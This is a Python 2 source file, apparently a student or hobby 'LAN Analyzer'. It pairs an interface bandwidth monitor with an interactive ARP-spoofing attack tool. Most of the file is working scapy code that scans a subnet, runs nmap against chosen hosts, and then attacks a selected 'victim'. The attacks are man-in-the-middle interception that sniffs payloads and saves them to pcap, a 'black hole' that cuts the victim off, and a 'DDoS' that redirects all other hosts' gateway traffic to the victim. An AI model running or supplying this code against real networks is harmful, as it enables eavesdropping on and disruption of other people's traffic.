from scapy.all import*
from struct import*
from datetime import datetime
from pandas import DataFrame
import os
import sys
import socket
import netifaces
import time
import enum
import sqlite3
import pandas as pd
import math


target_interface = "empty"
attacker_mac = "ff:ff:ff:ff:ff:ff"
broadcast_mac = "ff:ff:ff:ff:ff:ff"


class FunctionType(enum.IntEnum):
    MONITOR_THIS_DEVICE = 1
    ANALYZE_OTHERS = 2
class AnalysisType(enum.IntEnum):
    ANALYZE = 1
    ATTACK = 2
    TERMINATE = 3

class NmapOption(enum.IntEnum):
    A = 1
    O = 2
    NO_OPTION = 3

class AttackingType(enum.IntEnum):
    MAN_IN_THE_MIDDLE = 1
    BLACK_HOLE = 2
    DDOS = 3


class SniffType(enum.IntEnum):
    ALL_PACKETS = 1
    VICTIM_PACKETS = 2


def create_db_and_table():
    try:
        conn = sqlite3.connect("OUIMapping.db")
        conn.text_factory = str
        print "[Info.] Connect to database successfully..."

        read_file = pd.read_csv (r"./mac_address.csv")
        read_file.to_sql("OUIMAPPING", conn, if_exists="replace", index = False)
        print "[Info.] Create table in database successfully..."
    except BaseException as e:
        print "[Exception] %s %s" % (type(e), str(e))

    return conn

def manipulate_db(conn, sql_command):
    c = conn.cursor()
    result = c.execute(sql_command)
    for row in result:
        if row:
            return row
        else:
            return None

def man_in_the_middle(sniffing_mode_choice):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print "[Info.] Start to spoof gateway and victim...[Ctrl+C to stop]"

    gateway_MAC = getmacbyip(gateway_IP)
    if gateway_MAC is None:
        print "[Error] Failed to get gateway MAC."
        print "[Info.] Now exiting."
        sys.exit(1)
    else:
        print "[Info.] Gateway %s's MAC: %s" % (gateway_IP, gateway_MAC)

    victim_MAC = getmacbyip(victim_IP)
    if victim_MAC is None:
        print "[Error] Failed to get victim MAC."
        print "[Info.] Now exiting."
        sys.exit(1)
    else:
        print "[Info.] Victim %s's MAC: %s" % (victim_IP, victim_MAC)

    if sniffing_mode_choice == SniffType.ALL_PACKETS:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    while True:
        try:
            spoof_MITM(gateway_IP, gateway_MAC, victim_IP, victim_MAC)
            time.sleep(1)
            if sniffing_mode_choice == SniffType.ALL_PACKETS:
                packet = sock.recvfrom(65535)  # 128KB
                packet = packet[0]
                ip_header_length = parse_ip_header(packet)
                tcp_header_size = parse_tcp_header(packet, ip_header_length)
                parse_payload(packet, tcp_header_size)
            if sniffing_mode_choice == SniffType.VICTIM_PACKETS:
                sniff_network("MITM", victim_IP)

        except BaseException as e:
            print "[Exception] %s %s" % (type(e), str(e))
            restore_MITM(gateway_IP, victim_IP, gateway_MAC, victim_MAC)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print "[Info.] Man in the middle(MITM) attack is over."
            print "[Info.] Program is shutting down."
            sys.exit(1)


def spoof_MITM(gateway_IP, gateway_MAC, victim_IP, victim_MAC):
    send(ARP(op=2, psrc=victim_IP, pdst=gateway_IP, hwsrc=attacker_mac, hwdst=gateway_MAC), count=2)  # Fake ARP reply
    send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc=attacker_mac, hwdst=victim_MAC), count=2)  # Fake ARP reply


def restore_MITM(gateway_IP, victim_IP, gateway_MAC, victim_MAC):
    print "[Info.] Start to recover the LAN."
    print "[Info.] Please wait for a while."
    print "[Info.] Sending real ARP replies to gateway..."
    send(ARP(op=2, psrc=victim_IP, pdst=gateway_IP, hwsrc=victim_MAC, hwdst=gateway_MAC), count=8)  # Real ARP reply
    time.sleep(3)
    print "[Info.] Sending real ARP replies to victim..."
    send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc=gateway_MAC, hwdst=victim_MAC), count=8)  # Real ARP reply
    time.sleep(3)
    print "[Info.] The LAN has been recovered."


def parse_ip_header(packet):
    try:
        ip_header_raw_data = packet[0:20]
        ip_header = unpack("!BBHHHBBH4s4s", ip_header_raw_data)

        version_and_ihl = ip_header[0]
        version = version_and_ihl >> 4
        ihl = version_and_ihl & 0xF
        ip_header_length = ihl * 4

        type_of_servise = ip_header[1]
        total_length = ip_header[2]
        identification = ip_header[3]

        flags_and_offset = ip_header[4]
        flags = flags_and_offset >> 13
        fragment_offset = flags_and_offset & ((1 << 13) - 1)

        ttl = ip_header[5]
        protocol = ip_header[6]
        source_address = socket.inet_ntoa(ip_header[8])
        destination_address = socket.inet_ntoa(ip_header[9])

        print "[Info.] IP header:"
        print "{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s" \
            .format("Version", "IHL(4 bytes)", "Type of Service", "Total Length(bytes)", "Identification", "Flags",
                    "Fragment Offset", "Time to Live", "Protocol", "Source Address", "Destination Address") \
            % (str(version), str(ihl), str(type_of_servise), str(total_length), str(identification), str(flags),
                str(fragment_offset), str(ttl), str(protocol), str(source_address), str(destination_address))
    except BaseException as e:
        print "[Exception] Parsing IP header failed: %s %s" % (type(e), str(e))
        sys.exit(1)

    return ip_header_length


def parse_tcp_header(packet, ip_header_length):
    try:
        tcp_header_raw_data = packet[ip_header_length:ip_header_length + 20]
        tcp_header = unpack("!HHLLBBHHH", tcp_header_raw_data)

        source_port = tcp_header[0]
        dest_port = tcp_header[1]
        sequence = tcp_header[2]
        acknowledgement = tcp_header[3]

        data_offset_and_reserved = tcp_header[4]
        data_offset = data_offset_and_reserved >> 4

        window_size = tcp_header[6]
        checksum = tcp_header[7]

        print "\n[Info.] TCP header:"
        print "{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n{:<20}|%s\n" \
            .format("Source Port", "Dest Port", "Sequence Number", "Acknowledgement", "TCP Header Length", "Window Size", "Checksum") \
            % (str(source_port), str(dest_port), str(sequence), str(acknowledgement), str(data_offset), str(window_size), str(checksum))
        tcp_header_size = ip_header_length + data_offset * 4
    except BaseException as e:
        print "[Exception] Parsing TCP header failed: %s %s" % (type(e), str(e))
        sys.exit(1)

    return tcp_header_size


def parse_payload(packet, tcp_header_size):
    try:
        payload = packet[tcp_header_size:]
        data_size = len(packet) - tcp_header_size
        print "[Info.] Payload Size: %s" % (data_size)
        print "[Info.] Payload Content: \n%s\n============================================================" % (payload)
    except BaseException as e:
        print "[Exception] Parsing payload failed %s %s" % (type(e), str(e))
        sys.exit(1)


def sniff_network(function_name, victim_IP):
    bpf = "host %s" % victim_IP
    packets = sniff(iface=target_interface, count=10, filter=bpf,
                    prn=lambda x: x.sprintf("[Info.] Source: %IP.src% : %Ether.src%\n[Info.] Payload:\n%Raw.load%\n[Info.] Reciever: %IP.dst%\n ======================================================\n"))
    wrpcap("%s_traffic_log.pcap" % (function_name), packets, append=True)


def black_hole():
    print "[Info.] Start to poison the victim...[Ctrl+C to stop]"

    victim_MAC = getmacbyip(victim_IP)
    if victim_MAC is None:
        print "[Error] Failed to get victim MAC."
        print "[Info.] Now exiting."
        sys.exit(0)
    else:
        print "[Info.] Victim %s's MAC: %s" % (victim_IP, victim_MAC)

    while True:
        try:
            spoof_black_hole(gateway_IP, victim_IP, victim_MAC)
            time.sleep(1)
            sniff_network("BlackHole", victim_IP)

        except BaseException as e:
            print "[Exception] %s %s" % (type(e), str(e))
            restore_black_hole(gateway_IP, victim_IP, victim_MAC)
            print "[Info.] Black Hole attack is over."
            print "[Info.] Program is shutting down."
            sys.exit(1)


def spoof_black_hole(gateway_IP, victim_IP, victim_MAC):
    send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc="aa:aa:aa:aa:aa:aa", hwdst=victim_MAC), count=2)  # Fake ARP reply


def restore_black_hole(gateway_IP, victim_IP, victim_MAC):
    gateway_MAC = getmacbyip(gateway_IP)
    print "[Info.] Start to recover the LAN."
    print "[Info.] Please wait for a while."
    print "[Info.] Sending real ARP replies to victim..."
    send(ARP(op=2, psrc=gateway_IP, pdst=victim_IP, hwsrc=gateway_MAC, hwdst=victim_MAC), count=8)  # Real ARP reply
    time.sleep(3)
    print "[Info.] The LAN has been recovered."


def ddos():
    print "[Info.] Start to DDoS the victim"
    victim_MAC = getmacbyip(victim_IP)
    if victim_MAC is None:
        print "[Error] Failed to get victim MAC."
        print "[Info.] Now exiting."
        sys.exit(0)
    else:
        print "[Info.] Victim %s's MAC: %s" % (victim_IP, victim_MAC)

    while True:
        try:
            for item in device_list:
                target_IP = item["IP"]
                target_MAC = item["MAC"]
                if target_IP != victim_IP:
                    print "...target IP=%s, target MAC=%s..." % (target_IP, target_MAC)
                    print ">>>>>>gateway_IP=%s" % gateway_IP
                    spoof_ddos(gateway_IP, target_IP, victim_MAC, target_MAC)
            time.sleep(3)

        except BaseException as e:
            print "[Exception] %s %s" % (type(e), str(e))
            restore_ddos(gateway_IP, victim_IP)
            print "[Info.] DDoS attack is over."
            print "[Info.] Program is shutting down."
            sys.exit(1)


def spoof_ddos(gateway_IP, target_IP, victim_MAC, target_MAC):
    send(ARP(op=2, psrc=gateway_IP, pdst=target_IP, hwsrc=victim_MAC, hwdst=target_MAC), count=2)  # Fake ARP reply


def restore_ddos(gateway_IP, victim_IP):
    gateway_MAC = getmacbyip(gateway_IP)
    print "[Info.] Start to recover the LAN."
    print "[Info.] Please wait for a while."
    print "[Info.] Sending real ARP replies to all devices..."
    for item in device_list:
        print "device info: %s" % item
        target_IP = item["IP"]
        target_MAC = item["MAC"]
        if target_IP != victim_IP:
            send(ARP(op=2, psrc=gateway_IP, pdst=target_IP, hwsrc=gateway_MAC, hwdst=target_MAC), count=2)  # Real ARP reply
    time.sleep(3)
    print "[Info.] The LAN has been recovered."


class DataType(enum.IntEnum):
    RAW_DATA = 1
    ANALYZED_DATA = 2


def PlusANum(num, plusNum):
    return num + plusNum

def CalculateAverage(startByte, endByte, timeInterval):
    return round(((endByte - startByte) / timeInterval), 3)

def GetNetworkInterfaces():
    ifaces = []
    file_op = open("/proc/net/dev")
    data = file_op.read()
    file_op.close()
    data = data.split("\n")[2:]  # parse

    for item in data:
        if len(item.strip()) > 0:  # remove all ' ' in the head and tail in one row
            source_element = item.split()  # split one row into multiple elements by ' '
            source_map = {
                "interface": source_element[0][:len(source_element[0])-1],
                "rx": {
                    "bytes": int(source_element[1]),
                    "packets": int(source_element[2]),
                    "errs": int(source_element[3]),
                    "drop": int(source_element[4]),
                    "fifo": int(source_element[5]),
                    "frame": int(source_element[6]),
                    "compressed": int(source_element[7]),
                    "multicast": int(source_element[8])
                },
                "tx": {
                    "bytes": int(source_element[9]),
                    "packets": int(source_element[10]),
                    "errs": int(source_element[11]),
                    "drop": int(source_element[12]),
                    "fifo": int(source_element[13]),
                    "colls": int(source_element[14]),
                    "carrier": int(source_element[15]),
                    "compressed": int(source_element[16])
                }
            }
            ifaces.append(source_map)
    return ifaces

def monitor_this_device(available_interfaces ):
    # Config
    monitor_interval = 5
    monitor_time = 0

    print "[Info.] Available network interface(s):"
    for index in range(len(available_interfaces)):
        print ("[%d]: %s, MAC:%s" % ((index + 1), available_interfaces[index], netifaces.ifaddresses(available_interfaces[index])[netifaces.AF_LINK]))
    #print ("[%d]: All network interfaces" % (interfaces_count + 1))

    interface_choice = int(input("[Info.] Please select the interface you want to monitor.\n"))

    if interface_choice != interfaces_count + 1:  # not all network
        interface_s = available_interfaces[(int(interface_choice) - 1)]
    else:
        pass  # todo: split all interfaces to single one

    print ("[1]: Raw data")
    print ("[2]: Analyzed data")
    function_choice = int(input("[Info.] Please select the way you want to monitor.\n"))

    # Initialization
    print ("[Info.] Loading network interfaces...")
    idata = GetNetworkInterfaces()
    print ("[Info.] Filling initial tables...")
    initial_state = {}  # read-only
    ifaces = {}
    for eth in idata:
        ifaces[eth["interface"]] = {
            "rx_cur_rate": 0,
            "tx_cur_rate": 0,
            "rx_avg_rate": 0,
            "tx_avg_rate": 0,
            "rx_max_rate": 0,
            "tx_max_rate": 0,
            "rx_bytes": eth["rx"]["bytes"],
            "tx_bytes": eth["tx"]["bytes"],
            "rx_packets": eth["rx"]["packets"],
            "tx_packets": eth["tx"]["packets"],
            "rx_drop": eth["rx"]["drop"],
            "tx_drop": eth["tx"]["drop"],
            "rx_errs": eth["rx"]["errs"],
            "tx_errs": eth["tx"]["errs"]
        }
        initial_state[eth["interface"]] = {
            "rx_bytes": eth["rx"]["bytes"],
            "tx_bytes": eth["tx"]["bytes"],
            "rx_packets": eth["rx"]["packets"],
            "tx_packets": eth["tx"]["packets"],
            "rx_drop": eth["rx"]["drop"],
            "tx_drop": eth["tx"]["drop"],
            "rx_errs": eth["rx"]["errs"],
            "tx_errs": eth["tx"]["errs"]
        }
    # Wait monitor_interval for next sampling
    time.sleep(monitor_interval)
    monitor_time += monitor_interval

    # Raw data
    dash = "-" * 34
    if function_choice == DataType.RAW_DATA:
        while True:
            idata = GetNetworkInterfaces()
            for eth in idata:
                if eth["interface"] != interface_s:
                    continue
                print ("\nInterface: %s" % eth["interface"])

                print ("{:^8}|{:^12}|{:^12}\n%s".format("[rx]", "Field", "Value") % (dash))
                for rx_info in eth["rx"]:
                    print ("\t|{:<12}|{:>12}".format(rx_info, eth["rx"][rx_info]))

                print ("\n{:^8}|{:^12}|{:^12}\n%s".format("[tx]", "Field", "Value") % (dash))
                for tx_info in eth["tx"]:
                    print ("\t|{:<12}|{:>12}".format(tx_info, eth["tx"][tx_info]))

            time.sleep(monitor_interval)
            monitor_time += monitor_interval

    # Analyzed data
    dash = "-" * 104
    if function_choice == DataType.ANALYZED_DATA:
        while True:
            idata = GetNetworkInterfaces()
            for eth in idata:
                if eth["interface"] != interface_s:
                    continue
                # Calculate the current rate: (current bytes - last bytes) / time
                ifaces[eth["interface"]]["rx_cur_rate"] = CalculateAverage(ifaces[eth["interface"]]["rx_bytes"], eth["rx"]["bytes"], monitor_interval)
                ifaces[eth["interface"]]["tx_cur_rate"] = CalculateAverage(ifaces[eth["interface"]]["tx_bytes"], eth["tx"]["bytes"], monitor_interval)

                # Calculate the average rate: (current bytes - initial bytes) / total time
                ifaces[eth["interface"]]["rx_avg_rate"] = CalculateAverage(initial_state[eth["interface"]]["rx_bytes"], eth["rx"]["bytes"], monitor_time)
                ifaces[eth["interface"]]["tx_avg_rate"] = CalculateAverage(initial_state[eth["interface"]]["tx_bytes"], eth["tx"]["bytes"], monitor_time)

                # Set the current rx/tx bytes
                ifaces[eth["interface"]]["rx_bytes"] = eth["rx"]["bytes"]
                ifaces[eth["interface"]]["tx_bytes"] = eth["tx"]["bytes"]

                # Set the max rate: rate = max(rx_cur_rate, rx_max_rate)
                ifaces[eth["interface"]]["rx_max_rate"] = max(ifaces[eth["interface"]]["rx_cur_rate"], ifaces[eth["interface"]]["rx_max_rate"])
                ifaces[eth["interface"]]["tx_max_rate"] = max(ifaces[eth["interface"]]["tx_cur_rate"], ifaces[eth["interface"]]["tx_max_rate"])

                # Total packets sent
                ifaces[eth["interface"]]["rx_packets"] = (eth["rx"]["packets"] - initial_state[eth["interface"]]["rx_packets"])
                ifaces[eth["interface"]]["tx_packets"] = (eth["tx"]["packets"] - initial_state[eth["interface"]]["tx_packets"])

                # Total packets dropped
                ifaces[eth["interface"]]["rx_drop"] = (eth["rx"]["drop"] - initial_state[eth["interface"]]["rx_drop"])
                ifaces[eth["interface"]]["tx_drop"] = (eth["tx"]["drop"] - initial_state[eth["interface"]]["tx_drop"])

                # Total errors occurred
                ifaces[eth["interface"]]["rx_errs"] = (eth["rx"]["errs"] - initial_state[eth["interface"]]["rx_errs"])
                ifaces[eth["interface"]]["tx_errs"] = (eth["tx"]["errs"] - initial_state[eth["interface"]]["tx_errs"])

                print ("Interface: %s" % (eth["interface"]))
                print ("\t\t|{:<22}{:<22}{:<22}{:<10}{:<10}{:<10}\n\t%s". \
                    format("Max(bytes/sec.)", "Average(bytes/sec.)", "Current(bytes/sec.)", "Packet", "Dropped", "Error") % (dash))
                print ("\t[rx]\t|{:<22}{:<22}{:<22}{:<10}{:<10}{:<10}".format(
                    ifaces[eth["interface"]]["rx_max_rate"],
                    ifaces[eth["interface"]]["rx_avg_rate"],
                    ifaces[eth["interface"]]["rx_cur_rate"],
                    ifaces[eth["interface"]]["rx_packets"],
                    ifaces[eth["interface"]]["rx_drop"],
                    ifaces[eth["interface"]]["rx_errs"]))
                print ("\t[tx]\t|{:<22}{:<22}{:<22}{:<10}{:<10}{:<10}".format(
                    ifaces[eth["interface"]]["tx_max_rate"],
                    ifaces[eth["interface"]]["tx_avg_rate"],
                    ifaces[eth["interface"]]["tx_cur_rate"],
                    ifaces[eth["interface"]]["tx_packets"],
                    ifaces[eth["interface"]]["tx_drop"],
                    ifaces[eth["interface"]]["tx_errs"]))

            print ("[Info.] Total time elapsed:%d sec.\n" % (monitor_time))
            time.sleep(monitor_interval)
            monitor_time += monitor_interval


if __name__ == "__main__":
    print "[Info.] LAN Analyzer is starting up..."
    print "[Info.] Scanning network interfaces..."
    available_interfaces = get_if_list()#netifaces.interfaces()
    interfaces_count = len(available_interfaces)

    while True:
        function_type = int(raw_input("\n[Enter] Please select the function you want to do\n[1] Monitor network thourghput of this device\n[2] Analyze other device(s) in the same LAN\n>>"))
        if function_type == FunctionType.MONITOR_THIS_DEVICE:
            monitor_this_device(available_interfaces)
        elif function_type == FunctionType.ANALYZE_OTHERS:
            break
        else:
            continue

    print "[Info.] Available network interface(s):"
    for index in range(len(available_interfaces)):
        print ("[%d]: %s, MAC:%s" % ((index + 1), available_interfaces[index], netifaces.ifaddresses(available_interfaces[index])[netifaces.AF_LINK]))

    while True:
        interface_choice = int(raw_input("[Enter] Please select the interface you want to scan.\n>>"))
        if interface_choice > 0 and interface_choice <= interfaces_count:
            interface_name = available_interfaces[(interface_choice - 1)]
            break
        print "[Error.] Invalid network interface, please select again..."

    print "[Info.] Gateway IP:%s" % conf.route.route('0.0.0.0')[2]
    interface_network_config = netifaces.ifaddresses(interface_name)[netifaces.AF_INET]
    print "[Info.] Network info: %s" % interface_network_config
    interface_mac = netifaces.ifaddresses(interface_name)[netifaces.AF_LINK]
    print "[Info.] MAC info: %s" % (interface_mac)
    attacker_mac = interface_mac[0]["addr"]

    ip_range = raw_input("[Enter] Please input the IP range you want to scan in CIDR format(e.g., 192.168.0.0/24):\n>>")

    print "[Info.] Creating OUI DB..."
    connection = create_db_and_table()

    print "[Info.] Now scanning...\n[Info.] Please wait for a while..."
    conf.verb = 0
    start_time = datetime.now()

    ans, unans = arping(ip_range) #srp(Ether(dst=broadcast_mac)/ARP(pdst=ip_range), timeout=8, iface=interface_name, inter=0.12)
    device_list = []

    print "\n[Info.] Host list:\n{:^7}|{:^17}|{:^21}|{:^42}|{:^10}".format("No.", "IP", "MAC", "Company", "Country")
    count = 0
    for snd, rcv in ans:
        count += 1
        sql_command = ('''
            SELECT *
            FROM OUIMAPPING
            WHERE oui = "%s"
            '''
            % (rcv.sprintf("%Ether.src%").upper()[:8]))
        oui_info = manipulate_db(connection, sql_command)
        if not oui_info:
            device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%").upper(), "Company": "N/A", "Country": "N/A"})
        else:
            device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%").upper(), "Company": oui_info[2], "Country": oui_info[4]})
        print "[{:^5}]:{:^17}-{:^21}-{:^42}-{:^10}".format(count, device_list[(count - 1)]["IP"], device_list[(count - 1)]["MAC"], device_list[(count - 1)]["Company"], device_list[(count - 1)]["Country"])

    stop_time = datetime.now()
    total_time = stop_time - start_time
    device_count = len(device_list)
    print "\n[Info.] Scan completed.\n[Info.] Scan duration: %s sec." % (total_time)
    print "[Info.] Number of device(s) in the subnet %s: %d" % (ip_range, device_count)

    while True:
        analysis_type = int(raw_input("[Enter] Which function do you want?\n[1] Analyze other devices\n[2] Attack other devices\n[3] Terminate the program\n>>"))
        if analysis_type == AnalysisType.ANALYZE:
            nmap_target = int(raw_input("[Enter] Which device do you want to scan?\n>>"))
            nmap_opt = int(raw_input("[Enter] Which nmap option do you want?\n[1] -A: scan for services and OS information\n[2] -O: scan for OS information\n[3] No option\n>>"))
            print "[Info.] target port scanning:\n"
            if nmap_opt == NmapOption.A:
                os.system("nmap -A %s" % (device_list[nmap_target - 1]["IP"]))
            if nmap_opt == NmapOption.O:
                os.system("nmap -O %s" % (device_list[nmap_target - 1]["IP"]))
            if nmap_opt == NmapOption.NO_OPTION:
                os.system("nmap %s" % (device_list[nmap_target - 1]["IP"]))
        elif analysis_type == AnalysisType.ATTACK:
            break
        elif analysis_type == AnalysisType.TERMINATE:
            print "[Info.] Program is shutting down."
            sys.exit(1)
        else:
            continue

    while True:
        gateway_info = int(raw_input("[Enter] Please select the subnet gateway IP:\n>>"))
        if gateway_info > 0 and gateway_info <= device_count:
            break

    while True:
        victim_info = int(raw_input("[Enter] Please select an IP(Victim) to attack:\n>>"))
        if victim_info > 0 and victim_info <= device_count:
            break

    print "[Info.] Target interface:%s, victim: %s" % (interface_name, device_list[(victim_info - 1)]["IP"])

    available_attacking_mode = {AttackingType.MAN_IN_THE_MIDDLE, AttackingType.BLACK_HOLE, AttackingType.DDOS}
    available_sniffing_mode = {SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS}

    while True:
        print "[Info.] Please select an attacking mode:"
        print "[%d] Man in the middle(MITM)\n[%d] Black Hole\n[%d] DDoS" % (AttackingType.MAN_IN_THE_MIDDLE, AttackingType.BLACK_HOLE,AttackingType.DDOS)
        attacking_type = int(raw_input("[Enter] Function:\n>>"))
        if attacking_type in available_attacking_mode:
            break

    while True:
        target_interface = interface_name
        gateway_IP = device_list[(gateway_info - 1)]["IP"]
        victim_IP = device_list[(victim_info - 1)]["IP"]
        if attacking_type == AttackingType.MAN_IN_THE_MIDDLE:
            while True:
                print "[Info.] Please select the sniffing mode you want:"
                print "[%d] All packets in the specific network interface\n[%d] Only packets related to the victim" \
                    % (SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS)
                sniffing_mode_choice = int(raw_input("[Enter] Sniffing mode:\n>>"))
                if sniffing_mode_choice in available_sniffing_mode:
                    break
            man_in_the_middle(sniffing_mode_choice)
            break
        elif attacking_type == AttackingType.BLACK_HOLE:
            black_hole()
            break
        elif attacking_type == AttackingType.DDOS:
            ddos()
            break
        else:
            print "[Info.] Please select an available function"

    sys.exit(1)
